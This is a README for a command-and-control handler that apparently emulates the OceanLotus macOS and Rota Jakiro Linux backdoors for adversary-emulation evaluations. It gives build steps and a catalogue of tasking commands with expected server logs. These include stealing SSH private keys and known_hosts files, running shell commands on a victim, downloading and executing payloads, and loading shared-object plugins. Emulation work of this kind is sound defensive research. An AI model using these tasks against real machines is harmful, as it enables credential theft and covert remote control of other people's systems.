# OceanLotus TCP Handler

The OceanLotus TCP Handler functions as the server-side counterpart to the payload structure of the OceanLotus implant. The OceanLotus handler can communicate with the macOS & Linux implants based on the usage of HTTP or TCP packets. 

The handler _will be_ configured to do the following:
- Respond to macOS implant using HTTP
- Respond to Linux implant using TCP custom protocol
- create unique sessions based on operating system and protocol used
- register a new implant with the control server, or indicate that a session already exists for the implant
- Respond to implant task requests with the implant's session ID or tasks
- process the data returned after the implant completes tasks
- accept tasking from `.evalsC2client.py` and send the tasks to the implant when requested

## Usage
Open a terminal window, navigate to the `/evalsC2server` folder. Build & Start the Listener:
```zsh
go build -o controlServer main.go
sudo ./controlServer
```

Open a new terminal window, navigate to the same `/evalsC2server` folder. 

Copy/Paste the task command from the [commands section](### Tasks)

>Note: Only implants with sessions can be tasked, use the listener window to view the UUID of the implant. Look for the `[SUCCESS]` message 

## Commands
When using `--set-task` with the ./evalsC2client.py script, these are the strings accepted as commands with expected arguments passed
Two types of arguments are passed:
1. `int` (sleep only) - represents seconds and used for heartbeat
1. `string` (file management commands) - the file path to query, manipulate, upload, or download
1. `string` - the command to execute in a terminal

### Tasks

#### Rota Jakiro

- C2 timeout update
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_timeout", "arg": "1"}'
    ```
	- Expected C2 server log output:
        ```
        [Task] 2023/07/31 10:16:46 sleepy time updated!
        ```

- File upload
    > :information_source: **Note:** Any file uploaded will be called local_rota_file.so
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'
    ```
	- Expected C2 server log output:
		```
		[Task] 2023/07/31 13:40:34 successfully wrote entire file.
		```

- File download
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_steal_data", "arg": "/home/$USER/.ssh/id_rsa"}'
    ```
	- Expected C2 server log output
		```
		[SUCCESS] 2023/07/31 13:42:38 File uploaded: Successfully uploaded file to control server at './files/id_rsa'
		```

- File query
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "local_rota_file.so"}'
    ```
	- Expected C2 server output
		```
		[Task] 2023/07/31 13:43:02 file exists
		```

- Get device info
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_dev_info"}'
    ```
	- Expected C2 server output (username-machine-kernel)
		```
        [Task] 2023/07/31 13:46:20 gdev-Linux-6.1.39-1-lts
		```

- Delete file
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_delete_file", "arg":"local_rota_file"}'
    ```
- Shared Object execution
    > :information_source: **Note:** this Shared Object will be called local_rota_file.so, but the exported function name can be anything*
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_run_plugin", "arg": "update"}'
    ```

#### OSX.OceanLotus

- Run a command
    ```
    # task the OSX.OceanLotus implant to execute whoami on the victim machine
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_run_cmd", "arg":"whoami"}'
    ```
    - Expected C2 server log output:
        ```
        [Task] 2023/07/31 10:16:46 bob
        ```

- Get implant configuration information
    ```
    # task the OSX.OceanLotus implant to retrieve its stored configuration information
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_config_info"}'
    ```
    - Expected C2 server log output:
        ```
        [Task] 2023/07/31 10:19:10 Config Info:
        ID: yD89SSQbp8n7cjRooM28jg==
        Path: /Users/bob/Downloads/
        Install Time: 1690812988
        ```

- Get a file size (in bytes)
    ```
    # task the OSX.OceanLotus implant to get the file size in bytes of /Users/bob/.ssh/known_hosts
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_get_file_size", "arg":"/Users/bob/.ssh/known_hosts"}'
    ```
    - Expected C2 server log output
        ```
        [Task] 2023/07/31 10:21:39 Size of /Users/bob/.ssh/known_hosts: 1055 bytes
        ```

- Upload a file
    ```
    # task the OSX.OceanLotus implant to upload /Users/bob/.ssh/known_hosts from the victim machine to the C2 server
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_upload_file", "arg":"/Users/bob/.ssh/known_hosts"}'
    ```
    - Expected C2 server log output
        ```
        [SUCCESS] 2023/07/31 10:22:47 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
        ```

- Download a file
    > :information_source: **Note:** The implementation of the OSX.OceanLotus
    implant is only capable of downloading files to its current working directory
    with the file name of `osx.download`. This instruction does not return output.

    ```
    # task the OSX.OceanLotus implant to download hello_world to the local directory
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"hello_world"}'
    ```

- Download and execute a file
    > :information_source: **Note:** The implementation of the OSX.OceanLotus
    implant will also add the executable bit to the created `osx.download` file.

    ```
    # task the OSX.OceanLotus implant to download hello_world to the local directory then execute it
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_exec", "arg":"hello_world}'
    ```
    - Expected C2 server log output:
        ```
        [Task] 2023/07/31 10:30:30 Hello, world!
        ```

- Terminate the implant process
    > :information_source: **Note:** The implementation of the OSX.OceanLotus
    implant will not return output for this instruction.

    ```
    # task the OSX.OceanLotus implant to exit
    ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_exit"}'
    ```

### Testing

1. Build the evals C2 server 
    ```zsh
    go build -o controlServer
    ```
1. Start the handler
    ```zsh
    sudo ./controlServer
    ```
    Expected output:
    ```zsh
   [INFO] 2023/07/31 10:47:30 Starting C2 handlers
   [INFO] 2023/07/31 10:47:30 Starting the oceanlotus Handler...
[SUCCESS] 2023/07/31 10:47:30 Started handler oceanlotus
   [INFO] 2023/07/31 10:47:30 Handler simplehttp disabled. Skipping.
   [INFO] 2023/07/31 10:47:30 Waiting for connections
   [INFO] 2023/07/31 10:47:30 Starting Server...
    ```
    Look for `[SUCCESS] 2023/06/21 19:48:13 Started handler oceanlotus` -> should be in green. 

On the **victim** machine....
1. copy/paste the `sendIt.txt` file to the victim machine. Rename the file with a `.go` extenstion and grant executable permissions. This is a golang exe that will help in testing. 
    ```zsh
    mv sendIt.txt sendIt.go
    chmod +x sendIt.go
    ```
1. Execute the go program. 
    ```zsh
    go run sendIt.go
    ```
Output will look like the following:
    ```
    Header byte sequence being sent across the wire:
    [59 145 1 16 79 176 203 16 4 0 0 0 8 0 33 112 39 2 0 194 0 0 0 0 226 0 0 0 0 194 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 0 0 0 0 0 0]
    [114] [118] [0] [0]
    Verification Result:
    false
    Message received from mothership:
    Greetings from your server. 

    ```
On the Server you will see the following:
    ```
    [INFO] 2023/07/21 05:50:11 Starting Server...
    10.0.2.10:443
    Message received from client:
    [59 145 1 16 79 176 203 16 4 0 0 0 8 0 33 112 39 2 0 194 0 0 0 0 226 0 0 0 0 194 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 0 0 0 0 0 0]
    Are the markers right to idetnify this as a Lotus packet?:       true
    [INFO] 2023/07/21 05:50:14 Received first-time beacon from 39dd130a43ae3b7fcc85b9304fcdc10b. Creating session...

    [SUCCESS] 2023/07/21 05:50:14 *** New session established: 39dd130a43ae3b7fcc85b9304fcdc10b ***
    +----------------------------------+------------+----------+------+-----+------+
    |               GUID               | IP ADDRESS | HOSTNAME | USER | PID | PPID |
    +----------------------------------+------------+----------+------+-----+------+
    | 39dd130a43ae3b7fcc85b9304fcdc10b |            |          |      |   0 |    0 |
    +----------------------------------+------------+----------+------+-----+------+

    [INFO] 2023/07/21 05:50:14 Current Directory: 
    [INFO] 2023/07/21 05:50:14 Successfully added session.
    [SUCCESS] 2023/07/21 05:50:14 Successfully created session for implant 39dd130a43ae3b7fcc85b9304fcdc10b.
    [INFO] 2023/07/21 05:50:14 Session created for implant 39dd130a43ae3b7fcc85b9304fcdc10b
    [INFO] 2023/07/21 05:50:14 Initial data received from implant: 
    {"UUID":"39dd130a43ae3b7fcc85b9304fcdc10b"}
    What is being sent back to the client:   Greetings from your server. 
    ```
### Clean-up

Server: [control+c] to shutdown the C2 Handler
Victim: The program only ones once and dies.

## Components
Coming Soon...

## Encryption
Coming Soon...


## CTI References
- [NetLab 360 - Rota Jakiro Linux Backdoor](https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/)
- [Unit42 Palo Alto - OceanLotus macOS Backdoor](https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/)
- [NetLab 360 - Rota Jakiro Linux Backdoor vs OceanLotus macOS Backdoor ](https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/)
- [GitHub OceanLotus Scripts](https://github.com/eset/malware-research/tree/master/oceanlotus/)

